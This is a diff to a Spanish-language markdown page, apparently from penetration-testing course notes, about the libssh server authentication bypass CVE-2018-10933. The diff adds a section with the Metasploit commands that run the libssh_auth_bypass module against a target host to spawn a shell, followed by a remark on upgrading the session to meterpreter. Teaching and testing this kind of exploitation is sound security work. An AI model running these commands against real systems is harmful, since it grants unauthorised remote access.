@@ -8,4 +8,18 @@ En condiciones normales, un cliente SSH debe demostrar su identidad mediante un 
 
 La vulnerabilidad afectaba únicamente al código de libssh ejecutándose en modo servidor; las aplicaciones que utilizaban la biblioteca exclusivamente como cliente no estaban expuestas al problema. Las versiones vulnerables incluían las ramas 0.6.x, 0.7.x anteriores a la versión 0.7.6 y 0.8.x anteriores a la versión 0.8.4.
 
+### Explotación con MSF
+
+El módulo auxiliary/scanner/ssh/libssh_auth_bypass de Metasploit fue desarrollado para detectar y verificar la presencia de esta vulnerabilidad en sistemas que ejecutaban versiones afectadas de libssh, convirtiéndose en una de las implementaciones más conocidas para evaluar la exposición a CVE-2018-10933.
+
+```bash
+msf > use auxiliary/scanner/ssh/libssh_auth_bypass
+[*] Setting default action Shell - view all 2 actions with the show actions command
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > set rhosts host
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > set spawn_pty true
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > run
+```
+
+De la misma forma que en las vulnerabilidades linux anteriores, podemos elevar la sesión a meterpreter.
+
 [⟵ Anterior](../05_sistema.md#explotación-linux)
